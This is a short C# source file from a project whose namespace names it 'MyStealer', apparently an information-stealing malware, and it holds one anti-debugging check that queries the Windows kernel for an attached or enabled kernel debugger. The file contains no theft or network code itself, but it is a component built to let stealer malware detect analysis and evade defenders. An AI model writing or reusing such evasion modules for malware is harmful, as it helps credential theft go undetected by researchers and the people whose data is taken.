using System.Runtime.InteropServices;
using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Check
{
    internal class KernelDebugger : CheckBase
    {
        public override string Name => "Kernel debugger";

        private const uint SystemKernelDebuggerInformation = 0x23;

        public override bool CheckPassive()
        {
            var KernelDebugInfo = new SYSTEM_KERNEL_DEBUGGER_INFORMATION
            {
                KernelDebuggerEnabled = false,
                KernelDebuggerNotPresent = true
            };

            NtQuerySystemInformation_KernelDebuggerInfo(SystemKernelDebuggerInformation, ref KernelDebugInfo, (uint)Marshal.SizeOf(KernelDebugInfo), out var returnLength);

            return returnLength == (uint)Marshal.SizeOf(KernelDebugInfo)
                && (KernelDebugInfo.KernelDebuggerEnabled || !KernelDebugInfo.KernelDebuggerNotPresent);
        }
    }
}
